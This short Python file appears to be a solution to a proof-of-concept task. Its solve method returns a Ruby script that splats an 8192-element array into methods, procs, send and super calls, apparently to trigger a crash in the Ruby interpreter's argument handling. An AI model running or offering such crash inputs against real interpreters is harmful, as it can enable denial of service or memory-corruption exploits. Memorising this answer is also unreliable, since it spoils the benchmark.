import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = []
        poc.append("arr = Array.new(8192){|i| i }")
        poc.append("def foo(*a); end")
        poc.append("def foo2(*a); foo(*a); end")
        poc.append("def opt(a=1, b=2, *c); end")
        poc.append("foo(*arr)")
        poc.append("foo2(*arr)")
        poc.append("opt(*arr)")
        poc.append("proc{|*x|}.call(*arr)")
        poc.append("o = Object.new")
        poc.append("def o.m(*a); end")
        poc.append("o.m(*arr)")
        poc.append("send(:foo, *arr)")
        poc.append("def h(a, *b); end")
        poc.append("h(1, *arr)")
        poc.append("class A; def m(*a); end; end")
        poc.append("class B < A; def m(*args); super(*args); end; end")
        poc.append("B.new.m(*arr)")
        return ("\n".join(poc) + "\n").encode("utf-8")